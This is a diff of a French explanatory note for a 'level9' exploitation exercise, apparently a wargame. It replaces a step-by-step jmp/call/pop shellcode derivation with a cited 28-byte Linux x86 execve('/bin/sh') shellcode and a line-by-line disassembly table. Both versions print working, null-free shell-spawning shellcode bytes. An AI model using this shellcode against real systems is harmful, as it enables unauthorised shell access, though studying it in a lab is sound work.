@@ -1,133 +1,72 @@
-# Shellcode level9 — Pas à pas : de execve("/bin/sh") aux octets
+# Shellcode level9 — Référence et explication ligne par ligne
 
-## Objectif
+## Référence
 
-Obtenir la suite d’octets (shellcode) qui exécute **execve("/bin/sh", NULL, NULL)** sur i386 Linux, **sans octet nul** (pour rester utilisable dans une chaîne C/env).
+**Titre :** Linux x86 execve("/bin/sh") - 28 bytes  
+**Auteur :** Jean Pascal Pereira \<pereira@secbiz.de\>  
+**Source :** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)
 
-## Étape 1 — Appel système execve (i386)
-
-Sur Linux i386, **execve** est le syscall numéro **11** (0x0b).
-
-- **eax** = 11 (numéro du syscall)
-- **ebx** = adresse de la chaîne `"/bin/sh"`
-- **ecx** = adresse de **argv** (ex. tableau `[ptr vers "/bin/sh", 0]` ; peut être NULL)
-- **edx** = adresse de **env** (ex. NULL)
-- **int 0x80** → lance le syscall
-
-Donc en pseudo-code : `execve(ebx, ecx, edx)` avec ebx = "/bin/sh", ecx = NULL ou [&"/bin/sh", 0], edx = NULL.
-
-## Étape 2 — Problème : adresse de "/bin/sh"
-
-Le shellcode peut être injecté n’importe où (env, buffer). On ne connaît pas son adresse à l’avance. Il faut que le code soit **position-independent** : il doit trouver lui-même l’adresse de la chaîne `"/bin/sh"`.
-
-Technique classique : **jmp + call + pop**.
-
-- `jmp` saute par-dessus la chaîne `"/bin/sh"`.
-- `call` (vers une étiquette juste au-dessus de `"/bin/sh"`) pousse l’adresse de retour ( = adresse de `"/bin/sh"`) sur la stack.
-- `pop esi` (ou autre registre) récupère cette adresse → on a l’adresse de `"/bin/sh"` dans **esi**.
-
-Ensuite on construit argv (ex. [esi, 0]) et on fait execve(esi, …).
-
-## Étape 3 — Écriture en assembleur (exemple de structure)
-
-Idée (équivalent du shellcode classique utilisé en level9) :
-
-```asm
-    jmp    short after_string
-here:
-    pop    esi              ; esi = adresse de "/bin/sh"
-    mov    [esi+8], esi     ; argv[0] = esi
-    xor    eax, eax
-    mov    [esi+7], al      ; null byte après "/bin/sh"
-    mov    [esi+0xc], eax   ; argv[1] = NULL
-    mov    al, 11           ; syscall execve
-    mov    ebx, esi         ; path = "/bin/sh"
-    lea    ecx, [esi+8]     ; argv
-    lea    edx, [esi+0xc]   ; env
-    int    0x80
-    xor    ebx, ebx
-    mov    eax, ebx
-    inc    eax               ; eax=1 = exit
-    int    0x80
-after_string:
-    call   here
-    db     "/bin/sh"
+```c
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
+                   "\x68\x68\x2f\x62\x69\x6e\x89"
+                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+                   "\xcd\x80\x31\xc0\x40\xcd\x80";
 ```
 
-(Les offsets 7, 8, 0xc dépendent de la longueur de "/bin/sh" et du layout choisi.)
+Le shellcode construit la chaîne **"/bin//sh"** sur la pile (avec des push), puis appelle **execve(ebx, ecx, edx)** avec ebx = esp (pointeur vers la chaîne), ecx = 0, edx = 0. Aucune chaîne externe à concaténer.
 
-## Étape 4 — Assembler → obtenir les octets
+---
 
-1. **Sauver le source** dans un fichier, ex. `shell.asm`.
-
-2. **Assembler** (nasm, syntaxe Intel) :
-   - En **binaire brut** : `nasm -f bin shell.asm -o shell.bin`
-   - **Important :** le fichier `.asm` doit commencer par **`[bits 32]`** pour que nasm génère du code **32 bits**. Sans cela, nasm en `-f bin` assemble en 16 bits par défaut et on obtient des préfixes `66` (operand size) partout → shellcode incompatible avec un binaire i386.
-   - Alternative : `nasm -f elf32 shell.asm -o shell.o` puis extraire la section .text.
-
-3. **Extraire les octets bruts** :
-   - Si .o : trouver la section .text et son offset, puis extraire les octets (objcopy, ou lire avec objdump -s).
-   - Si .bin : directement les octets du fichier.
-
-4. **Afficher en hex** (pour copier dans Python) :
-   ```bash
-   xxd -p shell.bin
-   ```
-   ou
-   ```bash
-   hexdump -C shell.bin
-   ```
-
-5. **Convertir en chaîne Python** : chaque paire hex → `\xXX`.
-   - Ex. `eb1f5e89...` → `"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"` + `"/bin/sh"`.
-
-## Étape 5 — Correspondance octets ↔ instructions (décodage)
-
-Pour **vérifier** ou **comprendre** le shellcode level9 sans refaire l’asm à la main, on peut le **désassembler** :
-
-```bash
-echo -ne '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff' | ndisasm -u - 2>/dev/null || echo '...' | xxd -r -p | ndisasm -u -
-```
-
-Ou avec **objdump** : mettre les octets dans un .o (section .text) puis `objdump -d -M intel`.
-
-| Octets (début) | Instruction (approximatif) | Rôle |
-|----------------|----------------------------|------|
-| eb 1f          | jmp +0x1f                  | Sauter par-dessus la chaîne |
-| 5e             | pop esi                    | esi = adresse de "/bin/sh" (après call) |
-| 89 76 08       | mov [esi+8], esi          | Préparer argv |
-| 31 c0          | xor eax, eax              | eax = 0 |
-| 88 46 07       | mov [esi+7], al           | Null terminator après "/bin/sh" |
-| 89 46 0c       | mov [esi+0xc], eax        | argv[1] = NULL |
-| b0 0b          | mov al, 0xb               | eax = 11 (execve) |
-| 89 f3          | mov ebx, esi              | ebx = "/bin/sh" |
-| 8d 4e 08       | lea ecx, [esi+8]          | ecx = argv |
-| 8d 56 0c       | lea edx, [esi+0xc]        | edx = env |
-| cd 80          | int 0x80                  | execve("/bin/sh", argv, env) |
-| 31 db          | xor ebx, ebx              | ebx = 0 (pour exit) |
-| 89 d8          | mov eax, ebx              | eax = 0 |
-| 40             | inc eax                    | eax = 1 (syscall exit) |
-| cd 80          | int 0x80                  | exit(0) (si execve échoue) |
-| e8 dc ff ff ff | call rel                   | Retour en arrière → pop esi ; suivi de "/bin/sh" |
-
-La chaîne **"/bin/sh"** (8 caractères) est placée juste après le `call` ; le `call` pousse l’adresse de cette chaîne sur la stack, puis `pop esi` la récupère.
-
-## Résumé du flux de conversion
+## Désassemblage (auteur) — syntaxe AT&T
 
 ```
-1. Définir le but : execve("/bin/sh", NULL, NULL)
-2. Écrire l’assembleur (jmp/call/pop + setup argv/env + mov al,11 + int 0x80)
-3. Assembler : nasm -f bin shell.asm -o shell.bin
-4. Extraire les octets : xxd -p shell.bin
-5. Mettre en forme Python : \xXX pour chaque octet, puis concaténer "/bin/sh"
-6. Vérifier (optionnel) : ndisasm ou objdump sur les octets
+08048060 <_start>:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
 ```
 
-Le shellcode utilisé dans le walkthrough est un **classique** documenté (ex. shell-storm, exploit-db) ; on peut soit le dériver soi-même avec les étapes ci-dessus, soit le prendre tel quel et vérifier avec ndisasm.
+---
+
+## Explication de chaque instruction (ce que fait l’auteur)
+
+| Adresse   | Octets      | Instruction (AT&T)   | Rôle |
+|-----------|-------------|----------------------|------|
+| 8048060   | 31 c0       | xor %eax,%eax        | **eax = 0**. Utilisé pour NULL (argv, env) et pour le numéro de syscall à venir. |
+| 8048062   | 50          | push %eax            | Pousse **0** sur la pile. Sert de **terminateur nul** pour la chaîne "/bin//sh" (octet après 'h'). |
+| 8048063   | 68 2f 2f 73 68 | push $0x68732f2f | Pousse la constante **0x68732f2f** (little-endian = "//sh" en ASCII : 68='h', 73='s', 2f='/', 2f='/'). En lisant la pile : "//sh". |
+| 8048068   | 68 2f 62 69 6e | push $0x6e69622f | Pousse **0x6e69622f** ("/bin" en LE : 6e='n', 69='i', 62='b', 2f='/'). La pile contient donc **"/bin//sh\0"** (esp pointe au début). |
+| 804806d   | 89 e3       | mov %esp,%ebx        | **ebx = esp**. Premier argument d’execve : pointeur vers la chaîne "/bin//sh" (Linux accepte "/bin//sh" comme "/bin/sh"). |
+| 804806f   | 89 c1       | mov %eax,%ecx        | **ecx = eax = 0**. Deuxième argument : **argv = NULL**. |
+| 8048071   | 89 c2       | mov %eax,%edx        | **edx = eax = 0**. Troisième argument : **env = NULL**. |
+| 8048073   | b0 0b       | mov $0xb,%al         | **al = 11** (0x0b). Sur i386 Linux, le numéro du syscall **execve** est 11. |
+| 8048075   | cd 80       | int $0x80            | **Appel système** : execve(ebx="/bin//sh", ecx=NULL, edx=NULL) → lance le shell. |
+| 8048077   | 31 c0       | xor %eax,%eax        | **eax = 0** (pour le syscall exit). |
+| 8048079   | 40          | inc %eax             | **eax = 1** : numéro du syscall **exit**. |
+| 804807a   | cd 80       | int $0x80            | **exit(0)**. Exécuté si execve échoue (ou selon le comportement du noyau après execve réussi, le processus est remplacé donc ce code ne s’exécute pas dans le cas nominal). |
+
+---
+
+## Résumé du flux
+
+1. **Mise à zéro de eax** puis **push 0** → terminateur nul sur la pile.
+2. **Push "//sh"** puis **push "/bin"** → la chaîne **"/bin//sh\0"** est en mémoire, **esp** pointe au début.
+3. **ebx = esp** (path), **ecx = 0** (argv), **edx = 0** (env).
+4. **eax = 11**, **int 0x80** → execve("/bin//sh", NULL, NULL).
+5. **eax = 1**, **int 0x80** → exit(0) (fallback).
+
+Aucun octet nul dans le shellcode (sauf celui poussé sur la pile à l’exécution), ce qui permet de l’utiliser dans une chaîne C ou dans l’environnement.
 
 ## Références
 
-- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html
-- Syscalls i386 (numéros) : `/usr/include/asm/unistd_32.h` ou documentation Linux.
-- NASM : https://www.nasm.us/
-- ndisasm (désassembler des octets bruts) : fourni avec nasm.
+- Shellcode 811 : https://shell-storm.org/shellcode/files/shellcode-811.html  
+- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html  
